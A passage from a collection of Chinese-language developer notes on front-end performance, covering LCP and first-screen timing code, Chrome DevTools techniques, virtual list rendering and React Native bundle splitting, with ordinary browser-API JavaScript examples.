{\n        // 监控白屏时间\n        new PerformanceObserver((list) => {\n            for (const entry of list.getEntries()) {\n                if (entry.name === 'first-paint') {\n                    this.metrics.fp = entry.startTime;\n                    this.report('FP', entry.startTime);\n                }\n            }\n        }).observe({ entryTypes: ['paint'] });\n\n        // 监控 LCP\n        new PerformanceObserver((list) => {\n            const entries = list.getEntries();\n            const lastEntry = entries[entries.length - 1];\n            this.metrics.lcp = lastEntry.startTime;\n            this.report('LCP', lastEntry.startTime);\n        }).observe({\n            entryTypes: ['largest-contentful-paint']\n        });\n    }\n\n    report(metric, value) {\n        console.log(`${metric}: ${value}ms`);\n        // 可以在这里发送数据到分析服务器\n    }\n}\n\n// 使用监控\nconst monitor = new PerformanceMonitor();\n```\n\n### 1.7. 总结\n\nLCP 和白屏时间是两个不同的性能指标：\n1. 白屏时间反映的是**页面开始有内容**的时间点\n2. LCP 反映的是**页面主要内容加载完成**的时间点\n3. LCP 通常会大于白屏时间\n4. 两者都是重要的性能指标，但衡量的维度不同\n5. 优化策略也有所不同，需要根据具体场景选择关注点\n\n因此，LCP 不等于白屏时间，它们是衡量页面性能的两个独立指标。\n\n## 2. LCP（Largest Contentful Paint）和首屏时间\n\n### 2.1. 基本概念对比\n\n#### 2.1.1. LCP (Largest Contentful Paint)\n\n- 定义：==视口内最大内容元素呈现的时间点==\n- 计算：由**浏览器自动计算最大内容元素的渲染时间**\n- 特点：**是一个清晰的、可量化的指标**\n\n#### 2.1.2. 首屏时间（First Screen Paint）\n\n- 定义：首屏内容全部渲染完成的时间点\n- 计算：没有标准的计算方法，通常需要自定义计算\n- 特点：定义较为模糊，**依赖于具体业务场景**\n\n### 2.2. 关系分析\n\n1. **相似点**\n\t- 都关注用户可见内容的加载\n\t- 都是衡量页面性能的重要指标\n\t- 都与用户体验密切相关\n2. **区别**\n```javascript hl:27\n// LCP 示例\nnew PerformanceObserver((entryList) => {\n    const entries = entryList.getEntries();\n    const lastEntry = entries[entries.length - 1];\n    console.log('LCP:', lastEntry.startTime);\n}).observe({\n    entryTypes: ['largest-contentful-paint']\n});\n\n// 首屏时间计算示例（一种实现方式）\nclass FirstScreenTime {\n    constructor() {\n        this.firstScreenHeight = window.innerHeight;\n        this.startTime = performance.now();\n        this.isFirstScreenFinished = false;\n    }\n\n    checkFirstScreen() {\n        if (this.isFirstScreenFinished) return;\n\n        // 获取首屏内所有元素\n        const elements = document.querySelectorAll('*');\n        let isInFirstScreen = false;\n\n        for (let element of elements) {\n            const rect = element.getBoundingClientRect();\n            // 判断元素是否在首屏内\n            if (rect.top < this.firstScreenHeight) {\n                isInFirstScreen = true;\n                // 检查图片加载\n                const imgs = element.getElementsByTagName('img');\n                for (let img of imgs) {\n                    if (!img.complete) {\n                        return false;\n                    }\n                }\n            }\n        }\n\n        if (isInFirstScreen) {\n            this.isFirstScreenFinished = true;\n            const firstScreenTime = performance.now() - this.startTime;\n            console.log('First Screen Time:', firstScreenTime);\n            return true;\n        }\n\n        return false;\n    }\n}\n```\n\n### 2.3. 实际应用场景对比\n\n#### 2.3.1. LCP 适用场景\n\n```javascript\n// 电商商品详情页面\nclass ProductDetailPerformance {\n    constructor() {\n        this.observeLCP();\n    }\n\n    observeLCP() {\n        new PerformanceObserver((entryList) => {\n            const entries = entryList.getEntries();\n            const lastEntry = entries[entries.length - 1];\n            \n            // 通常是商品主图\n            if (lastEntry.element) {\n                console.log('Product main image loaded:', lastEntry.startTime);\n                this.reportLCP(lastEntry.startTime);\n            }\n        }).observe({\n            entryTypes: ['largest-contentful-paint']\n        });\n    }\n\n    reportLCP(time) {\n        // 上报数据\n    }\n}\n```\n\n#### 2.3.2. 首屏时间适用场景\n\n```javascript hl:17\n// 新闻列表页面\nclass NewsListPerformance {\n    constructor() {\n        this.startTime = performance.now();\n        this.observeFirstScreen();\n    }\n\n    observeFirstScreen() {\n        const newsItems = document.querySelectorAll('.news-item');\n        let loadedItems = 0;\n\n        const observer = new IntersectionObserver((entries) => {\n            entries.forEach(entry => {\n                if (entry.isIntersecting) {\n                    loadedItems++;\n                    \n                    // 假设首屏显示5条新闻\n                    if (loadedItems === 5) {\n                        const firstScreenTime = performance.now() - this.startTime;\n                        console.log('News List First Screen Time:', firstScreenTime);\n                        this.reportFirstScreen(firstScreenTime);\n                        observer.disconnect();\n                    }\n                }\n            });\n        });\n\n        newsItems.forEach(item => observer.observe(item));\n    }\n\n    reportFirstScreen(time) {\n        // 上报数据\n    }\n}\n```\n\n### 2.4. 监控方案对比\n\n#### 2.4.1. 综合监控方案\n\n```javascript\nclass PerformanceMonitor {\n    constructor() {\n        this.metrics = {\n            lcp: 0,\n            firstScreen: 0\n        };\n        this.init();\n    }\n\n    init() {\n        // 监控 LCP\n        this.observeLCP();\n        // 监控首屏\n        this.observeFirstScreen();\n    }\n\n    observeLCP() {\n        new PerformanceObserver((list) => {\n            const entries = list.getEntries();\n            const lastEntry = entries[entries.length - 1];\n            this.metrics.lcp = lastEntry.startTime;\n            this.report('LCP', lastEntry.startTime);\n        }).observe({\n            entryTypes: ['largest-contentful-paint']\n        });\n    }\n\n    observeFirstScreen() {\n        // MutationObserver 监听 DOM 变化\n        const observer = new MutationObserver(() => {\n            const now = performance.now();\n            if (this.isFirstScreenReady()) {\n                this.metrics.firstScreen = now - performance.timing.navigationStart;\n                this.report('FirstScreen', this.metrics.firstScreen);\n                observer.disconnect();\n            }\n        });\n\n        observer.observe(document.body, {\n            childList: true,\n            subtree: true\n        });\n    }\n\n    isFirstScreenReady() {\n        // 自定义首屏判断逻辑\n        const viewHeight = window.innerHeight;\n        const elements = document.querySelectorAll('*');\n        let isReady = true;\n\n        for (let el of elements) {\n            const rect = el.getBoundingClientRect();\n            if (rect.top < viewHeight) {\n                // 检查图片加载\n                const imgs = el.getElementsByTagName('img');\n                for (let img of imgs) {\n                    if (!img.complete) {\n                        isReady = false;\n                        break;\n                    }\n                }\n            }\n        }\n\n        return isReady;\n    }\n\n    report(metric, value) {\n        console.log(`${metric}: ${value}ms`);\n        // 上报逻辑\n    }\n}\n```\n\n### 2.5. 性能优化建议\n\n#### 2.5.1. **共同优化点**\n\n```javascript\n// 1. 资源预加载\n<link rel=\"preload\" href=\"critical.js\" as=\"script\">\n<link rel=\"preload\" href=\"hero-image.jpg\" as=\"image\">\n\n// 2. 图片优化\n<img \n    src=\"product.jpg\" \n    loading=\"eager\" \n    fetchpriority=\"high\"\n    srcset=\"product-300.jpg 300w, product-600.jpg 600w\"\n    sizes=\"(max-width: 600px) 300px, 600px\"\n>\n\n// 3. 关键CSS内联\n<style>\n    /* 首屏关键样式 */\n    .hero-section {\n        /* ... */\n    }\n</style>\n```\n\n#### 2.5.2. **差异化优化**\n\n- LCP优化：\n\t- 关注**最大**内容元素\n- 首屏优化：\n\t- 关注视口内**所有**内容\n\n```javascript\n// LCP优化：关注最大内容元素\nconst optimizeLCP = () => {\n    // 1. 识别LCP元素\n    new PerformanceObserver((list) => {\n        const entries = list.getEntries();\n        const lcpElement = entries[entries.length - 1];\n        if (lcpElement.element) {\n            // 2. 针对性优化\n            if (lcpElement.element.tagName === 'IMG') {\n                lcpElement.element.fetchPriority = 'high';\n            }\n        }\n    }).observe({\n        entryTypes: ['largest-contentful-paint']\n    });\n};\n\n// 首屏优化：关注视口内所有内容\nconst optimizeFirstScreen = () => {\n    // 1. 延迟非首屏内容加载\n    const deferNonFirstScreen = () => {\n        const elements = document.querySelectorAll('[data-defer]');\n        const observer = new IntersectionObserver((entries) => {\n            entries.forEach(entry => {\n                if (entry.isIntersecting) {\n                    const element = entry.target;\n                    // 加载延迟的内容\n                    element.src = element.dataset.src;\n                    observer.unobserve(element);\n                }\n            });\n        });\n\n        elements.forEach(element => observer.observe(element));\n    };\n\n    // 2. 首屏资源优先级管理\n    document.querySelectorAll('img').forEach(img => {\n        if (img.getBoundingClientRect().top < window.innerHeight) {\n            img.loading = 'eager';\n            img.fetchPriority = 'high';\n        } else {\n            img.loading = 'lazy';\n        }\n    });\n};\n```\n\n### 2.6. 总结\n\n- **关系**：\n\t- LCP 是首屏时间的一个组成部分，但不完全等同\n\t- LCP 只关注最大内容元素，首屏时间关注整个首屏区域\n\t- LCP 通常小于首屏时间\n- **选择建议**：\n\t- 如果需要标准化的性能指标，建议使用 LCP\n\t- 如果需要更全面的用户体验评估，建议同时监控首屏时间\n\t- 在实际应用中，两者结合使用能更好地评估页面性能\n- **监控建议**：\n\t- LCP：使用标准的 PerformanceObserver API\n\t- 首屏时间：根据**业务场景自定义计算方法**\n\t- **建议同时监控多个指标，全面评估页面性能**","mjotYaGO":"\n# 前端性能排查手段（篇一： 先用好 Chrome DevTools ）\n\n`#前端性能` `#R1` \n\n## 目录\n<!-- toc -->\n ## 1. 性能监控 \n\n按下图操作展开\n\n![图片&文件](./files/20241130-4.png)\n\n检测渲染是否卡顿\n\n- ![图片&文件](./files/20241130-3.png)\n\n任务管理\n\n![图片&文件](./files/20241130-5.png)\n\n## 2. Elements（元素面板）\n\n- DOM 树检查和编辑\n- CSS 样式查看和修改\n- 计算样式（Computed）查看\n\t- 盒子模型\n- 事件监听器\n- DOM 断点\n\t- DOM 监控\n- 属性修改\n- **布局检查器**\n\n## 3. Console（控制台）\n\n- JavaScript 交互式环境\n- 错误和警告日志\n- 网络请求日志\n- 控制台 API\n- 多行编辑器\n- 过滤器和搜索\n- 控制台设置 \n- 实时表达式求值\n- 多行编辑器模式\n\n## 4. Sources（源代码）\n\n- 源代码查看和编辑\n- 文件树浏览\n- 源码编辑器\n- 调试器\n\t- 断点调试\n\t- 断点管理\n- **调用堆栈**\n- 作用域变量\n- 代码段管理\n- `Watch` 表达式\n- 源码映射\n\n## 5. Network（网络）\n\n- 网络请求监控\n- 请求列表\n- 请求详情\n\t- 请求详情分析\n- 资源时间线\n\t- 时间轴\n- 过滤器\n\t- 请求筛选和搜索\n- 请求阻止\n- 网络限速模拟\n- 离线模式 \n\n## 6. Performance（性能）\n\n- CPU 分析\n- 内存分析\n- 帧率监控\n- 事件分析\n- 火焰图\n- 垃圾回收分析\n- 层级时间轴\n- 网络瀑布图 \n- 性能瓶颈识别\n\n## 7. Memory（内存）\n\n- 堆快照\n- 内存泄漏检测\n- 内存分配时间轴\n- 内存分配采样\n- 对象保留树\n- 比较视图\n- GC 垃圾回收分析\n\n## 8. Performance Insights\n\n- 性能指标\n- 优化建议\n- 性能评分\n- 加载时间分析\n- 交互性分析 \n\n## 9. Application（应用）\n\n- 存储查看器\n\t- Local Storage\n\t- Session Storage\n\t- IndexedDB\n\t- Web SQL\n\t- Cookies\n- Cache Storage\n- Background Services\n- 清除存储数据\n- Storage（存储）\n\t- 配额使用情况\n\t- 服务工作线程\n\t- 清除站点数据\n\t- 存储持久化\n\n## 10. Device Mode\n\n- 响应式设计模式\n- 设备模拟\n- 网络模拟\n- 传感器模拟\n- 位置模拟 \n\n## 11. Remote Debugging\n\n- USB 调试\n- 网络检查\n- 屏幕截图\n- 端口转发 \n\n## 12. Security（安全） & Privacy（隐私）\n\n- HTTPS 证书信息\n- 混合内容检查\n- 安全问题\n- 源信息 \n- Privacy（隐私）\n\t- Cookie 检查\n\t- 权限管理\n\t- 信任设置\n\t- 安全上下文 \n\n## 13. Layers（图层）\n\n- 合成层查看\n- 3D 视图\n- 图层边界\n- 绘制分析\n![图片&文件](./files/20241130-6.png)\n\n## 14. Animations（动画）\n\n- 动画时间轴\n- 动画控制\n- 缓动函数编辑器\n- 动画检查器 \n\n## 15. Changes（更改）\n\n- CSS 更改跟踪\n- DOM 更改跟踪\n- 修改对比\n- 更改历史 \n\n## 16. 实验面板\n\n- CSS 概览\n- WebAuthn\n- 问题选项卡\n- 3D 视图\n- 网络请求阻止\n- 源码订阅\n\n## 17. 开发者实验\n\n- Protocol Monitor:\n- Network Console\n- WebAssembly 调试\n- CSS 概览\n- 问题选项卡 \n\n## 18. Rendering（渲染）\n\n- FPS 计量表\n- Paint flashing\n- Layer borders\n- Scrolling bottlenecks\n- **Core Web Vitals**\n\n## 19. Command Menu（命令菜单）\n\n- 快速打开文件\n- 运行命令\n- 切换功能\n- 设置访问 \n\n## 20. Settings（设置）\n\n- 主题设置\n- 工作区\n- 实验功能\n- 快捷键\n- 设备模式\n- 网络设置\n- 控制台设置 \n\n## 21. 扩展支持\n\n- Chrome DevTools 扩展\n- 自定义面板\n- 调试器扩展\n- 主题扩展 \n\n## 22. 集成功能\n\n- Lighthouse 集成\n- **Coverage 覆盖率**\n\t- 这个很有用，看看有多少没用的东西\n- CSS 概览\n- Issues 问题面板\n- 渲染性能 \n\n","iAA9APdL":"\n# 前端性能排查手段（篇二： Chrome DevTools  使用技巧总结）\n\n`#前端性能` \n\n\n## 目录\n<!-- toc -->\n ## 1. AI 辅助功能 \n\n### 1.1. AI 助手面板\n\n- 位置：DevTools 右侧边栏中的 AI 图标\n- 功能：\n\t- 代码分析和解释\n\t- 性能优化建议\n\t- CSS 样式问题诊断\n\t- JavaScript 代码优化建议\n- 使用方法：选择代码或元素，AI 助手会自动分析并提供建议 \n\n### 1.2. 智能代码补全\n\n```javascript\n// 在 Console 中输入代码时会提供智能提示\ndocument.querySelector('.my-class').addEventListener('click', () => {\n    // AI 会提供上下文相关的代码建议\n})\n```\n\n## 2. Elements 面板高级技巧\n\n### 2.1. DOM 断点\n\n```javascript\n// 右键点击元素，选择 \"Break on...\"\n// - subtree modifications（子树修改）\n// - attribute modifications（属性修改）\n// - node removal（节点删除）\n```\n\n### 2.2. 样式调试\n\n- 使用 `:hov` 强制元素状态\n- 使用 `cls` 快速切换类名\n- CSS Grid 和 Flexbox 调试工具\n- CSS 选择器统计功能 \n- 使用 `Computed` 查看计算后的样式\n- 使用 `Layout` 查看==盒模型==\n- CSS Grid 和 Flexbox 可视化工具\n\n## 3. Console 面板技巧\n\n### 3.1. 高级日志\n\n```javascript\n// 分组日志\nconsole.group('用户操作');\nconsole.log('点击按钮');\nconsole.groupEnd();\n\n// 表格展示\nconsole.table([{name: 'John', age: 30}, {name: 'Jane', age: 25}]);\n\n// 性能计时\nconsole.time('操作耗时');\n// ... 执行代码 ...\nconsole.timeEnd('操作耗时');\n```\n\n### 3.2. Console 实用工具\n\n- `$_` 获取上次表达式结果\n- `$0-$4` 最近选择的 DOM 元素\n- `monitor()` 函数调用监控\n- `debug()` 函数断点调试 \n\n## 4. Network 面板技巧\n\n### 4.1. 请求分析\n\n```javascript\n// 使用过滤器\n// Protocol: 'http', 'https'\n// Domain: 'example.com'\n// Method: 'POST', 'GET'\n// Status: '200', '404'\n\n// 过滤请求 \n// 使用关键字过滤 \nis:running // 仅显示正在进行的请求 \nlarger-than:100kb // 大于100kb的请求 \n-main_frame // 排除主框架请求\n```\n\n### 4.2. 高级功能\n\n- 请求阻止（Request blocking）\n- 请求重放（Replay XHR）\n- 带宽限制（Throttling）\n\t- CPU 也可以限流\n- Early Hints 头部信息查看\n- 使用 `Waterfall` 分析加载顺序\n- 检查资源压缩状态\n- 分析请求优先级\n- 模拟不同网络条件\n\n## 5. Performance 面板\n\n### 5.1. 性能记录\n\n```javascript\n// 使用 Performance API\nperformance.mark('startTask');\n// ... 执行任务 ...\nperformance.mark('endTask');\nperformance.measure('taskDuration', 'startTask', 'endTask');\n```\n\n### 5.2. 分析工具\n\n- 火焰图分析\n- 主线程活动\n- 帧率监控\n- 内存使用分析\n- 识别**长任务（Long Tasks）**\n- 分析帧率（FPS）\n- 查看 CPU 和内存使用情况\n- 分析事件监听器影响\n\n## 6. Application 面板\n\n### 6.1. 存储管理\n\n```javascript\n// 查看和管理\n// - Local Storage\n// - Session Storage\n// - IndexedDB\n// - Web SQL\n// - Cookies\n```\n\n### 6.2. PWA 调试\n\n- Service Worker 管理\n- Manifest 查看\n- Cache Storage 管理\n- Background Services 监控 \n\n## 7. 开发者工具扩展\n\n- React Developer Tools\n- Vue.js devtools\n- Redux DevTools\n- Apollo Client DevTools\n\n## 8. 性能优化工具\n\n### 8.1. Lighthouse\n\n```javascript\n// 在 DevTools 中运行 Lighthouse\n// 1. 打开 Lighthouse 面板\n// 2. 选择需要的审计类别\n// 3. 生成报告\n```\n\n### 8.2. 性能监控\n\n- Coverage 面板（未使用代码分析）\n- Memory 面板（内存泄露分析）\n- Performance Insights\n- Web Vitals 监控\n\n## 9. 调试技巧\n\n### 9.1. 断点类型\n\n```javascript\n// 条件断点\n// 右键点击行号 -> Add conditional breakpoint\nif (someCondition) {\n    debugger; // 手动断点\n}\n```\n\n### 9.2. 高级调试\n\n- 异步调用堆栈\n- 黑盒脚本（Blackboxing）\n- 源码映射（Source Maps）\n- 实时表达式（Live Expressions）\n","qpT7Bvq6":"\n# 前端性能排查手段（篇三：总结）\n\n`#前端性能` \n\n## 目录\n<!-- toc -->\n ## 1. 网络层面 \n\n- Network 面板监控\n\t- 请求瀑布图分析\n\t- 资源加载时序\n\t- ==请求体积/压缩率==\n\t- DNS/TCP/TLS 时间\n\t- TTFB (Time to First Byte)\n\t- 资源优先级\n\n## 2. 渲染性能\n\n- Performance 面板\n\t- **FPS (帧率)监控**\n\t- 主线程阻塞分析\n\t- 渲染时间分布\n\t- 布局抖动检测\n\t- 强制同步布局\n\t- **Long Tasks 识别**\n\n## 3. 运行时性能\n\n- Memory 面板\n\t- 内存泄漏检测\n\t- 内存占用趋势\n\t- **DOM 节点数量**\n\t- JS 堆内存分析\n\t- **分离 DOM 检测**\n\t- 定时器使用情况\n\n## 4. 核心性能数据\n\n- Core Web Vitals\n\t- LCP (最大内容渲染)\n\t- FID (首次输入延迟)\n\t- CLS (累积布局偏移)\n\t- FCP (首次内容渲染)\n\t- TTI (可交互时间)\n\n## 5. JavaScript 性能\n\n- 代码执行分析\n\t- 函数执行时间\n\t- 调用栈分析\n\t- 闭包内存\n\t- 垃圾回收频率\n\t- 微任务/宏任务队列\n\n## 6. 资源优化\n\n- ==Coverage 分析==\n\t- ==未使用代码检测==\n\t- CSS 利用率\n\t- JS 代码覆盖率\n\t- 资源加载优先级\n\t- 懒加载效果\n- 资源加载时间\n- 资源大小监控\n- 缓存命中率\n- API 响应时间\n- 带宽使用情况\n\n## 7. 布局性能\n\n- Layers 面板\n\t- 图层合成\n\t- 重绘区域\n\t- 布局范围\n\t- 绘制时间\n\t- 合成原因\n\n## 8. 用户体验\n\n- 性能监控\n\t- 用户交互延迟\n\t- 滚动性能\n\t- 动画流畅度\n\t- 输入响应度\n\t- 页面稳定性\n\n## 9. 自动化分析\n\n- Lighthouse 审计\n\t- 性能得分\n\t- 可访问性\n\t- 最佳实践\n\t- SEO 分析\n\t- PWA 检测\n\n## 10. 业务监控\n\n- 自定义性能指标\n\t- 业务 KPI\n\t- 错误率统计\n\t- API 响应时间\n\t- 页面停留时间\n\t- 用户行为分析\n\n## 11. 移动端特有\n\n- 设备模拟\n- **CPU 节流**\n- 网络限制\n- 内存限制\n- 电池消耗\n- 触摸事件延迟\n\n## 12. 第三方影响\n\n- 资源加载监控\n\t- 第三方脚本影响\n\t- SDK 性能分析\n\t- 广告加载延迟\n\t- 统计代码开销\n\t- 外部依赖评估\n\n## 13. 缓存分析\n\n- 存储检查\n\t- HTTP 缓存\n\t- Service Worker\n\t- 浏览器存储\n\t- CDN 缓存\n\t- 协商缓存\n\n## 14. 安全性能\n\n- 安全检查\n\t- HTTPS 开销\n\t- CSP 影响\n\t- 混合内容\n\t- 证书验证时间\n\t- 安全重定向\n\n## 15. 构建优化\n\n- 产物分析\n\t- 打包体积\n\t- 模块依赖\n\t- Tree-shaking 效果\n\t- 分包策略\n\t- 压缩效率\n\n## 16. 兼容性能\n\n- 跨浏览器测试\n\t- 特性支持\n\t- 降级方案\n\t- Polyfill 开销\n\t- 渲染差异\n\t- API 兼容性\n\n## 17. 预加载策略\n\n- 资源优化\n\t- Preload\n\t- Prefetch\n\t- DNS-prefetch\n\t- Preconnect\n\t- 预渲染效果\n\n## 18. 错误监控\n\n- 异常捕获\n\t- JS 错误\n\t- 资源加载失败\n\t- Promise 异常\n\t- API 错误\n\t- 性能异常\n\n## 19. 框架相关\n\n- 特定优化\n\t- 虚拟 DOM 性能\n\t- 组件渲染\n\t- 状态管理\n\t- 路由切换\n\t- 更新机制\n\n## 20. 持续监控\n\n- 性能监控系统\n\t- 实时监控\n\t- 报警机制\n\t- 趋势分析\n\t- 性能预测\n\t- 异常定位\n\n\n","oLY1euwb":"\n# 性能优化的思路\n\n`#前端性能`  \n\n> 源于个人某次分享\n\n\n## 目录\n<!-- toc -->\n ## 1. 性能优化三板斧 \n\n![图片&文件](./files/20241101-18.png)\n\n## 2. 缓存\n\n### 2.1. web 缓存技术\n\n![图片&文件](./files/20241101-19.png)\n\n### 2.2. 常见的缓存技术\n\n![图片&文件](./files/20241101-20.png)\n\n## 3. 预加载\n\n### 3.1. 资源预加载\n\n![图片&文件](./files/20241101-21.png)\n\n### 3.2. 数据预数据\n\n![图片&文件](./files/20241101-22.png)\n\n## 4. 渲染\n\n### 4.1. 渲染分类\n\n![图片&文件](./files/20241101-23.png)\n\n### 4.2. csr → ssr\n\n![图片&文件](./files/20241101-24.png)\n\n### 4.3. 预渲染的案例\n\n![图片&文件](./files/20241101-25.png)\n\n### 4.4. 其他运行时优化思路\n\n- 避免强制布局\n- 批量化操作\n- 长列表\n- 任务拆解\n- 并行：worker\n- css 善用合成\n\n## 5. 一些启发\n\n![图片&文件](./files/20241101-26.png)\n","mCXyZ50V":"\n# 长列表或大数据渲染优化的一些思路\n\n\n`#前端` `#前端性能` \n\n\n## 目录\n<!-- toc -->\n ## 1. 先说导致长列表性能及体现不佳的本质原因 \n\n- 需要 `渲染大量的DOM节点` 及 `频繁的DOM操作` ，展开说就是每个节点都需要浏览器进行`计算`、`布局`和`绘制` 等。 如果总结，那么其实就是 所谓的 **CPU的瓶颈**\n- 另外，就是一些网络原因了，毕竟请求总是需要耗费时间的，这就是所谓的 **IO的瓶颈** （这里主要指`网络IO`） \n\n\n> 总结：所有的性能体验问题的本质原因都是：CPU 和 IO 的瓶颈\n\n## 2. 一些常见的优化思路\n\n### 2.1. 分页\n\n最简单且见效的方法，但需要与 `用户体验` 做平衡\n\n### 2.2. 虚拟滚动、虚拟列表\n\n比较常见且大规模应用的思路，具体的一些`要点`：\n\n- `可视区域`： 做`绝对定位`，left、right、top 设置为 0\n- `滚动区域`：用于`形成滚动条`，做绝对定位，`left、right、top` 设置为 0，`z-index:-1`\n- `真实渲染区域`：滚动时使用`translate3d(x,y,z)`\n\n具体步骤：\n\n1. 计算当前可见区域起始数据的 `startIndex`\n2. 计算当前可见区域结束数据的 `endIndex`\n3. 计算当前可见区域的数据，并渲染到页面中\n4. 计算 `startIndex` 对应的数据在整个列表中的偏移位置 `startOffset`，并设置到列表上\n5. 在滚动的时候，修改`真实渲染区域`的 `transform: translate3d(0, y, 0)`\n\n下面是一段示例代码：\n\n```javascript\nupdateVisibleData(scrollTop) {\n  scrollTop = scrollTop || 0;\n  // 取得可见区域的可见列表项数量\n  const visibleCount = Math.ceil(this.$el.clientHeight / this.itemHeight); \n  // 取得可见区域的起始数据索引\n  const start = Math.floor(scrollTop / this.itemHeight); \n  // 取得可见区域的结束数据索引\n  const end = start + visibleCount; \n  // 计算出可见区域对应的数据，让 Vue.js 更新\n  this.visibleData = this.data.slice(start, end); \n  // 把可见区域的 top 设置为起始元素在整个列表中的位置（使用 transform 是为了更好的性能）\n  this.$refs.content.style.webkitTransform = `translate3d(0, ${ start * this.itemHeight }px, 0)`; \n}\n```\n\n`动态高度`的场景：需要在渲染时`动态计算`每个列表项的高度，并根据`实际高度`进行渲染，下面是`updateVisibleData` 的一个思路。\n\n```javascript\nupdateVisibleData(scrollTop) {\n  scrollTop = scrollTop || 0;\n  const start = this.findNearestItemIndex(scrollTop);\n  const end = this.findNearestItemIndex(scrollTop + this.$el.clientHeight);\n  this.visibleData = this.data.slice(start, Math.min(end + 1, this.data.length));\n  // 通过具体方法来设计\n  this.$refs.content.style.webkitTransform = `translate3d(0, ${    this.getItemSizeAndOffset(start).offset }px, 0)`; \n}\n```\n\n一个细节，`ios` 没法实时 触发 `scroll` 的问题？\n\n- 使用 `iscroll` 或者 `better-scroll` 等成熟的第三方库\n- `ontouchmove` 来兼容下\n- `-webkit-overflow-scrolling:touch` 设置有`回弹效果`\n   - `auto`: 使用普通滚动, 当手指从触摸屏上移开，滚动会立即停止。\n   - `touch` , 有回弹效果\n\n### 2.3. 其他的一些细节优化点\n\n- 使用`骨架片`优化白屏\n- 使用新的API，提高性能\n\t- `scroll` 时，使用 `requestAnimationFrame` 来包装回调\n\t- 或者做下`节流`\n- 使用`缓存`，需要把`尺寸、偏移`等信息进行一个`缓存` \n- 图片`懒加载`\n\n## 3. 其他的思路\n\n- 使用`缓存` ，包括数据缓存，也包括重复利用节点等\n- `懒加载` 与 `预加载`\n- 减少 DOM 操作 ，精简 DOM 结构\n- 使用`Web Worker` 将页面的`渲染`和`计算逻辑`分离开来\n- 服务器端渲染 ， `SSR` \n- CSS\n\t- CSS布局优化，减少`回流`等 \n\t- CSS3硬件加速\n- 优化渲染性能，比如`CSS样式优化`和 `JS性能优化`\n- 图片优化 ， `懒加载`和`预加载` 及 `压缩` ，`缩略图` ， 图片格式比如 `WebP` 更小，`jpg` 更快渲染等\n- 使用渐进式渲染 ，先渲染关键内容\n- 新 API 使用，比如 `requestIdleCallback` 空闲时间再执行\n- `HTTP`请求优化等\n\n> [!tip]\n  JPEG 格式不支持透明度设置\n\n## 4. 最后\n\n还是需要根据`实际情况` 选择 `ROI` 最佳的方案，找**主要矛盾**\n\n注意，没必要过早优化，过早优化会导致很多问题\n\n","nYg8LdDm":"\n# 如何治理端侧性能\n\n\n`#跨端` `#移动端` `#react-native` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- PRPL 模式\n\t- 预加载、预渲染、预缓存、懒加载\n- 注意==找真实场景==\n\t- 比如特定网络环境、特定机型等\n- React-native 拆包原理\n\t- 默认是打成一个包\n\t- 拆包：基于`路由`或者基于`功能模块`\n- 常见的 js 引擎\n\t- v8：nodejs 、Chrome\n\t\t- 优先考虑执行速度\n\t\t- 占用更多内存\n\t- jscore → Safari\n\t\t- 优先考虑更快的启动时间\n\t\t- 内存占用较小\n\t\t- 适合==移动端场景==，因为\n\t\t\t- 需要快速启动的应用\n\t\t\t- 内存受限的环境 \n\n## 2. PRPL 模式\n\n- `Preload` 预加载**最重要**的资源\n- `Render` **尽快**渲染初始内容\n- `Pre-cache` **预缓存**其他资源\n- `Lazy load` **懒加载**其他路由和非关键资源\n\n>  它对做性能优化有指导意义\n\n## 3. 端侧做性能优化时的注意点\n\n- 需要找**真实场景**\n- 低端机器\n\t- 比如 `webp ios14` 后也支持了\n\n## 4. 如何减少布局偏移\n\n- `骨架片`\n- 为动态元素`预留静态`空间\n- `图片宽高`尺寸固定\n\n## 5. 性能监控体系\n\n- 帧率监控\n- 内存使用\n- 等等\n\n## 6. React-native 拆包原理\n\n### 6.1. 基础概念\n\nRN 的打包默认会将所有 JS 代码打包成一个 `bundle 文件`：\n\n```\n项目代码\n   ↓\n打包工具(Metro)\n   ↓\n单一 bundle.js\n```\n\n这种方式存在的问题：\n\n- 首次加载时间长\n- 资源利用效率低\n- 更新成本高\n- 内存占用大\n\n### 6.2. 拆包核心原理\n\n基本思路是将代码分成不同的包： `基础包` + `业务包A 、B、C...`\n\n```\nCommon(基础包)\n   ↓\n业务包A  业务包B  业务包C\n```\n\n拆分策略：\n\n```javascript\n// 基础包（common.bundle）\n- React Core\n- React Native 框架代码\n- 公共组件\n- 工具函数\n\n// 业务包（business.bundle）\n- 业务逻辑代码\n- 页面组件\n- 业务相关资源\n```\n\n### 6.3. 实现方式\n\nMetro 配置示例：\n```javascript\n// metro.config.js\nmodule.exports = {\n  transformer: {\n    getTransformOptions: async () => ({\n      transform: {\n        experimentalImportSupport: false,\n        inlineRequires: true,\n      },\n    }),\n  },\n  serializer: {\n    createModuleIdFactory() {\n      // 自定义模块 ID 生成\n      return (path) => {\n        // 根据路径生成唯一ID\n      };\n    },\n    processModuleFilter(module) {\n      // 模块过滤规则\n      return true;\n    },\n  }\n};\n```\n\n### 6.4. 拆包策略\n\n#### 6.4.1. 基于路由拆分\n\n```javascript\n// 按路由加载不同的包\nconst loadBundle = async (bundleName) => {\n  await RNBundleLoader.load(`${bundleName}.bundle`);\n};\n\n// 路由配置\nconst routes = {\n  Home: {\n    screen: HomeScreen,\n    bundle: 'home'\n  },\n  Profile: {\n    screen: ProfileScreen,\n    bundle: 'profile'\n  }\n};\n```\n\n#### 6.4.2. 基于功能模块拆分\n\n```javascript\n// 功能模块拆分\n- 核心模块（core.bundle）\n- 支付模块（payment.bundle）\n- 社交模块（social.bundle）\n- 直播模块（live.bundle）\n```\n\n### 6.5. 加载机制\n\n动态加载实现：\n\n```javascript\n// 动态加载bundle\nasync function loadBusinessBundle(bundleName) {\n  try {\n    // 检查是否已加载\n    if (!isBundleLoaded(bundleName)) {\n      // 加载bundle\n      await globalLoader.loadBundle(`${bundleName}.bundle`);\n      // 更新加载状态\n      markBundleAsLoaded(bundleName);\n    }\n    // 执行业务代码\n    return requireModule(bundleName);\n  } catch (error) {\n    console.error('Bundle load failed:', error);\n  }\n}\n```\n\n### 6.6. 优化策略\n\n#### 6.6.1. 预加载优化\n\n```javascript\n// 预加载关键bundle\nclass BundlePreloader {\n  static async preloadCriticalBundles() {\n    const criticalBundles = ['home', 'feed'];\n    return Promise.all(\n      criticalBundles.map(bundle => loadBusinessBundle(bundle))\n    );\n  }\n}\n```\n\n#### 6.6.2. 缓存策略\n\n```javascript\n// bundle缓存管理\nclass BundleCache {\n  static async saveBundle(bundleName, content) {\n    await 